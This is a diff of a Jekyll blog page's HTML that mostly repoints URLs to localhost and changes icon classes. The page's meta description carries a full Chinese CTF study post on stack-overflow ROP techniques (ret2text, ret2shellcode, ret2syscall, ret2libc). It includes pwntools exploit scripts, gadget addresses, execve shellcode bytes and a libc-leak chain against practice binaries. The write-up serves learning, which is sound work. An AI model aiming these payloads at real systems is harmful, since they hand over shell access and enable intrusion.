@@ -20,26 +20,26 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="My way, though far away">
 <meta property="og:title" content="Pwnit 3">
-<meta property="og:url" content="https://zjgcjy.github.io/posts/2019-03/Pwnit-3.html">
+<meta property="og:url" content="http://localhost:4000/posts/2019-03/Pwnit-3.html">
 
 
   <meta property="og:description" content="  pwn学习资料，来自ctf-wiki。基本 ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件  程序存在溢出，并且可以控制返回地址。  可以找到满足条件的 gadgets 以及相应 gadgets 的地址。如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。ret2textret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。这种类型的题目，一般都有system函数，只要通过栈溢出来劫持控制流，返回到特定地址即可。通过在r2中查看，我们可以看到程序中有该函数，直接跳转到该地址即可，不要跳转到secure函数首地址，因为pwn就是具有任意性，既然可以控制控制流了，就直接到system函数即可。脚本也很简单。ret_addr = 0x804863apayload = &#39;a&#39;*0x6c + &#39;bbbb&#39; + p32(ret_addr)sh.recvuntil(&#39;?\n&#39;)sh.sendline(payload)ret2shellcoderet2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。一般就是在bss段进行读写操作，然后将返回地址控制到bss段地址。脚本如下：s.recv()ret_addr = 0x0804A080payload = asm(shellcraft.sh()).ljust(112, &#39;\x90&#39;) + p32(ret_addr)s.sendline(payload)s.recv()s.interactive()x64  sniperoj-pwn100-shellcode-x86-64分析这个题也是常规的栈溢出，然后ret2shellcode即可，需要注意的是，由于栈空间的限制，我们想要ret2shellcode的大小只有24，需要找一个64位下长度小于24的shellcode才能成功。而且由于shellcode都有压栈和出栈操作，而我们的shellcode又正好都在esp的上面，这会导致shellcode被压栈给覆盖，导致shellcode执行失败，需要注意这个问题。所以我们可以将shellcode放在esp的上面，由于它不会一开始就pop指令，这样就能防止它被覆写，从而getshell。但是这个题输入长度也有限制，一共64，除去填充的32，shellcode的长度要求必须小于32，所以我们选用网上提供的shellcode即可。脚本如下s.recvuntil(&#39;[&#39;)ret_addr = int(s.recvuntil(&#39;]&#39;, drop=True), 16)# 23 bytes# https://www.exploit-db.com/exploits/36858/shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;payload = &#39;b&#39; * 24 + p64(ret_addr + 32) + shellcode_x64s.sendline(payload)s.recv()s.interactive()ret2syscallret2syscall，即控制程序执行系统调用，获取 shell。和ret2libc不一样的是，ret2syscall是不需要用到libc的，这就让我们必须在程序本身中找到gadget，实现system(&#39;/bin/sh&#39;)或者execve(&#39;/bin/sh&#39;, NULL, NULL)。这种方式是通过 shell 获取系统调用。所以这种方式一般适合于静态链接的程序。简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取。execve(&quot;/bin/sh&quot;,NULL,NULL)其中，该程序是 32 位，所以我们需要使得  系统调用号，即 eax 应该为 0xb  第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。  第二个参数，即 ecx 应该为 0  第三个参数，即 edx 应该为 0所以我们需要通过gadget来控制这4个寄存器。ROPgadget --binary ./rop --only &#39;pop|ret&#39;|ag pop0x080bb196 : pop eax ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret还要找到sh的地址，和int 0x80的地址。ROPgadget --binary ./rop --string &quot;/bin/sh&quot;0x080be408 : /bin/shROPgadget --binary ./rop |ag &quot;int 0x80&quot;0x08049421 : int 0x80有了这几个gadget之后，我们按照顺序来排布数据，最后再进行系统调用即可getshell。pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([cyclic(112), pop_edx_ecx_ebx_ret, 0, 0, binsh, pop_eax_ret, 0xb, int_0x80])#payload = shellcode_x64.ljust(24, &#39;\x90&#39;) + p64(ret_addr)s.sendline(payload)s.recv()s.interactive()ret2libcret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。第一题我们需要的一般有2个地址，对于第一个题来说，system和参数地址都提供了，一个在plt表中，一个在bss段中。所以很简单。objdump -d -j .plt -M intel ./ret2libc1|ag @plt08048430 &lt;gets@plt&gt;:08048440 &lt;time@plt&gt;:08048450 &lt;puts@plt&gt;:08048460 &lt;system@plt&gt;:08048470 &lt;__gmon_start__@plt&gt;:08048480 &lt;srand@plt&gt;:08048490 &lt;__libc_start_main@plt&gt;:080484a0 &lt;setvbuf@plt&gt;:080484b0 &lt;rand@plt&gt;:080484c0 &lt;__isoc99_scanf@plt&gt;:ROPgadget --binary ./ret2libc1 --string &quot;/bin/sh&quot;0x08048720 : /bin/sh脚本如下所示：system_plt = 0x08048460binsh_addr = 0x08048720payload = flat([cyclic(112), system_plt, 0xdeadbeef, binsh_addr])#payload = shellcode_x64.ljust(24, &#39;\x90&#39;) + p64(ret_addr)s.sendline(payload)s.recv()s.interactive()第二题和第一题差不多，只不过没有bash字符串了，需要手动写入进去，由于aslr的不确定性。我使用的方法布局好栈帧，劫持返回地址到got表中的gets，然后再调用gets，将sh字符串写入bss段中。然后再控制返回地址到system@plt。ROPgadget --binary ./ret2libc2 --only &#39;pop|ret&#39;0x0804872f : pop ebp ; ret脚本如下，和第一题差不多，只不过需要注意的是，由于要连续调用2次函数，其中需要一次rop，才能成功布局好栈帧，否则会调用失败。buf_addr = 0x0804a068pop_addr = 0x0804872fpayload = flat([cyclic(112), elf.plt[&#39;gets&#39;], pop_addr, buf_addr])payload +=flat([elf.plt[&#39;system&#39;],0xdeadbeef, buf_addr])#payload = shellcode_x64.ljust(24, &#39;\x90&#39;) + p64(ret_addr)s.sendline(payload)s.send(&quot;/bin/sh\x00&quot;)s.recv()s.interactive()第三题在第二题的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。  system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。  即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下  https://github.com/niklasb/libc-database所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme  https://github.com/lieanu/LibcSearcher此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下  泄露 __libc_start_main 地址  获取 libc 版本  获取 system 地址与 /bin/sh 的地址  再次执行源程序  触发栈溢出执行 system(‘/bin/sh’)s.recv()payload = flat([cyclic(112), elf.plt[&#39;puts&#39;], elf.sym[&#39;_start&#39;], elf.got[&#39;__libc_start_main&#39;]])s.sendline(payload)libc.address = u32(s.recv(4))- libc.symbols[&#39;__libc_start_main&#39;]log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))assert libc.address &amp; 0xfff == 0s.recv()payload = flat([cyclic(112), libc.sym[&#39;system&#39;], 0xdeadbeef, next(libc.search(&quot;/bin/sh&quot;))])s.sendline(payload)#s.recv()s.interactive()当然我之后试了下神器one_gadget，作为217战队的成员开发的一建getshell工具，命令如下。它也提示了我们需要getshell的约束条件，我用的是最后一个，即esi指向libc的GOT表首地址，eax需要为0。由于这个题，第二次gets函数结束后eax就是0，这一个条件就满足了，然后要设置esi的值，这里不是很懂，但是经过调试发现esi的值就是GOT表的首地址，可能是调用got表中的函数之后就会将其值设置成该地址，具体不清楚。然后我们直接返回到libc首地址加偏移量即可。第四题练习题差不多的，主要是最后one_gadget的地址不一样，因为eax不是0，这样我们可以通过设置[esp]=0来getshell。s.recvuntil(&#39;The address&#39;)binsh_addr = int(s.recvuntil(&#39;\n&#39;, drop=True)[-10:], 16)puts_got = int(s.recvuntil(&#39;\n&#39;, drop=True)[-10:], 16)libc.address = puts_got - libc.symbols[&#39;puts&#39;]log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))payload = flat([cyclic(32), 0x6985c + libc.address, 0])s.sendline(payload)s.interactive()">
 
 
 
-  <meta property="og:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
 
 
 
   <meta name="twitter:site" content="@zjgcjy">
   <meta name="twitter:title" content="Pwnit 3">
   <meta name="twitter:description" content="  pwn学习资料，来自ctf-wiki。基本 ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件  程序存在溢出，并且可以控制返回地址。  可以找到满足条件的 gadgets 以及相应 gadgets 的地址。如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。ret2textret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。这种类型的题目，一般都有system函数，只要通过栈溢出来劫持控制流，返回到特定地址即可。通过在r2中查看，我们可以看到程序中有该函数，直接跳转到该地址即可，不要跳转到secure函数首地址，因为pwn就是具有任意性，既然可以控制控制流了，就直接到system函数即可。脚本也很简单。ret_addr = 0x804863apayload = &#39;a&#39;*0x6c + &#39;bbbb&#39; + p32(ret_addr)sh.recvuntil(&#39;?\n&#39;)sh.sendline(payload)ret2shellcoderet2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。一般就是在bss段进行读写操作，然后将返回地址控制到bss段地址。脚本如下：s.recv()ret_addr = 0x0804A080payload = asm(shellcraft.sh()).ljust(112, &#39;\x90&#39;) + p32(ret_addr)s.sendline(payload)s.recv()s.interactive()x64  sniperoj-pwn100-shellcode-x86-64分析这个题也是常规的栈溢出，然后ret2shellcode即可，需要注意的是，由于栈空间的限制，我们想要ret2shellcode的大小只有24，需要找一个64位下长度小于24的shellcode才能成功。而且由于shellcode都有压栈和出栈操作，而我们的shellcode又正好都在esp的上面，这会导致shellcode被压栈给覆盖，导致shellcode执行失败，需要注意这个问题。所以我们可以将shellcode放在esp的上面，由于它不会一开始就pop指令，这样就能防止它被覆写，从而getshell。但是这个题输入长度也有限制，一共64，除去填充的32，shellcode的长度要求必须小于32，所以我们选用网上提供的shellcode即可。脚本如下s.recvuntil(&#39;[&#39;)ret_addr = int(s.recvuntil(&#39;]&#39;, drop=True), 16)# 23 bytes# https://www.exploit-db.com/exploits/36858/shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;payload = &#39;b&#39; * 24 + p64(ret_addr + 32) + shellcode_x64s.sendline(payload)s.recv()s.interactive()ret2syscallret2syscall，即控制程序执行系统调用，获取 shell。和ret2libc不一样的是，ret2syscall是不需要用到libc的，这就让我们必须在程序本身中找到gadget，实现system(&#39;/bin/sh&#39;)或者execve(&#39;/bin/sh&#39;, NULL, NULL)。这种方式是通过 shell 获取系统调用。所以这种方式一般适合于静态链接的程序。简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取。execve(&quot;/bin/sh&quot;,NULL,NULL)其中，该程序是 32 位，所以我们需要使得  系统调用号，即 eax 应该为 0xb  第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。  第二个参数，即 ecx 应该为 0  第三个参数，即 edx 应该为 0所以我们需要通过gadget来控制这4个寄存器。ROPgadget --binary ./rop --only &#39;pop|ret&#39;|ag pop0x080bb196 : pop eax ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret还要找到sh的地址，和int 0x80的地址。ROPgadget --binary ./rop --string &quot;/bin/sh&quot;0x080be408 : /bin/shROPgadget --binary ./rop |ag &quot;int 0x80&quot;0x08049421 : int 0x80有了这几个gadget之后，我们按照顺序来排布数据，最后再进行系统调用即可getshell。pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([cyclic(112), pop_edx_ecx_ebx_ret, 0, 0, binsh, pop_eax_ret, 0xb, int_0x80])#payload = shellcode_x64.ljust(24, &#39;\x90&#39;) + p64(ret_addr)s.sendline(payload)s.recv()s.interactive()ret2libcret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。第一题我们需要的一般有2个地址，对于第一个题来说，system和参数地址都提供了，一个在plt表中，一个在bss段中。所以很简单。objdump -d -j .plt -M intel ./ret2libc1|ag @plt08048430 &lt;gets@plt&gt;:08048440 &lt;time@plt&gt;:08048450 &lt;puts@plt&gt;:08048460 &lt;system@plt&gt;:08048470 &lt;__gmon_start__@plt&gt;:08048480 &lt;srand@plt&gt;:08048490 &lt;__libc_start_main@plt&gt;:080484a0 &lt;setvbuf@plt&gt;:080484b0 &lt;rand@plt&gt;:080484c0 &lt;__isoc99_scanf@plt&gt;:ROPgadget --binary ./ret2libc1 --string &quot;/bin/sh&quot;0x08048720 : /bin/sh脚本如下所示：system_plt = 0x08048460binsh_addr = 0x08048720payload = flat([cyclic(112), system_plt, 0xdeadbeef, binsh_addr])#payload = shellcode_x64.ljust(24, &#39;\x90&#39;) + p64(ret_addr)s.sendline(payload)s.recv()s.interactive()第二题和第一题差不多，只不过没有bash字符串了，需要手动写入进去，由于aslr的不确定性。我使用的方法布局好栈帧，劫持返回地址到got表中的gets，然后再调用gets，将sh字符串写入bss段中。然后再控制返回地址到system@plt。ROPgadget --binary ./ret2libc2 --only &#39;pop|ret&#39;0x0804872f : pop ebp ; ret脚本如下，和第一题差不多，只不过需要注意的是，由于要连续调用2次函数，其中需要一次rop，才能成功布局好栈帧，否则会调用失败。buf_addr = 0x0804a068pop_addr = 0x0804872fpayload = flat([cyclic(112), elf.plt[&#39;gets&#39;], pop_addr, buf_addr])payload +=flat([elf.plt[&#39;system&#39;],0xdeadbeef, buf_addr])#payload = shellcode_x64.ljust(24, &#39;\x90&#39;) + p64(ret_addr)s.sendline(payload)s.send(&quot;/bin/sh\x00&quot;)s.recv()s.interactive()第三题在第二题的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。  system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。  即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下  https://github.com/niklasb/libc-database所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme  https://github.com/lieanu/LibcSearcher此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下  泄露 __libc_start_main 地址  获取 libc 版本  获取 system 地址与 /bin/sh 的地址  再次执行源程序  触发栈溢出执行 system(‘/bin/sh’)s.recv()payload = flat([cyclic(112), elf.plt[&#39;puts&#39;], elf.sym[&#39;_start&#39;], elf.got[&#39;__libc_start_main&#39;]])s.sendline(payload)libc.address = u32(s.recv(4))- libc.symbols[&#39;__libc_start_main&#39;]log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))assert libc.address &amp; 0xfff == 0s.recv()payload = flat([cyclic(112), libc.sym[&#39;system&#39;], 0xdeadbeef, next(libc.search(&quot;/bin/sh&quot;))])s.sendline(payload)#s.recv()s.interactive()当然我之后试了下神器one_gadget，作为217战队的成员开发的一建getshell工具，命令如下。它也提示了我们需要getshell的约束条件，我用的是最后一个，即esi指向libc的GOT表首地址，eax需要为0。由于这个题，第二次gets函数结束后eax就是0，这一个条件就满足了，然后要设置esi的值，这里不是很懂，但是经过调试发现esi的值就是GOT表的首地址，可能是调用got表中的函数之后就会将其值设置成该地址，具体不清楚。然后我们直接返回到libc首地址加偏移量即可。第四题练习题差不多的，主要是最后one_gadget的地址不一样，因为eax不是0，这样我们可以通过设置[esp]=0来getshell。s.recvuntil(&#39;The address&#39;)binsh_addr = int(s.recvuntil(&#39;\n&#39;, drop=True)[-10:], 16)puts_got = int(s.recvuntil(&#39;\n&#39;, drop=True)[-10:], 16)libc.address = puts_got - libc.symbols[&#39;puts&#39;]log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))payload = flat([cyclic(32), 0x6985c + libc.address, 0])s.sendline(payload)s.interactive()">
-  <meta name="twitter:url" content="https://zjgcjy.github.io/posts/2019-03/Pwnit-3.html">
+  <meta name="twitter:url" content="http://localhost:4000/posts/2019-03/Pwnit-3.html">
 
   
     <meta name="twitter:card" content="summary">
     
-      <meta name="twitter:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
     
   
 
@@ -58,7 +58,7 @@
   
 
 
-<link rel="canonical" href="https://zjgcjy.github.io/posts/2019-03/Pwnit-3.html">
+<link rel="canonical" href="http://localhost:4000/posts/2019-03/Pwnit-3.html">
 
 
 
@@ -69,7 +69,7 @@
     
       "@type": "Person",
       "name": "Blogger",
-      "url": "https://zjgcjy.github.io/",
+      "url": "http://localhost:4000/",
       "sameAs": ["https://twitter.com/","https://github.com/"]
     
   }
@@ -193,7 +193,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="https://zjgcjy.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -263,26 +263,26 @@
     <ul class="author__urls social-icons">
       
         <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
-          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
+          <i class="fa fa-map-marker" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
         </li>
       
 
       
         
           
-            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i> Website</a></li>
+            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fa fa-link" aria-hidden="true"></i> Website</a></li>
           
         
           
-            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fa fa-envelope-square" aria-hidden="true"></i> Email</a></li>
           
         
           
-            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
           
         
           
-            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
           
         
       
@@ -681,7 +681,7 @@
   
 
   <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <strong><i class="fa fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
       
@@ -695,7 +695,7 @@
 
 
         
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-01T10:01:00+08:00">March 01, 2019</time></p>
+          <p class="page__date"><strong><i class="fa fa-calendar" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-01T10:01:00+08:00">March 01, 2019</time></p>
         
       </footer>
 
@@ -704,11 +704,11 @@
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+3%20https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-3.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+3%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-3.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fa fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-3.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-3.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fa fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-3.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-3.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -934,16 +934,16 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
       
         
-          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
         
       
         
-          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
         
       
     
 
-    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    <li><a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i> Feed</a></li>
   </ul>
 </div>
 
@@ -954,7 +954,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
 
     
   <script src="/assets/js/main.min.js"></script>
-  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+  <script src="https://use.fontawesome.com/1d25d6ba93.js"></script>
 
 
 
@@ -969,7 +969,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
   <script>
     var disqus_config = function () {
-      this.page.url = "https://zjgcjy.github.io/posts/2019-03/Pwnit-3.html";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.url = "http://localhost:4000/posts/2019-03/Pwnit-3.html";  // Replace PAGE_URL with your page's canonical URL variable
       this.page.identifier = "/posts/2019-03/Pwnit-3"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     (function() { // DON'T EDIT BELOW THIS LINE
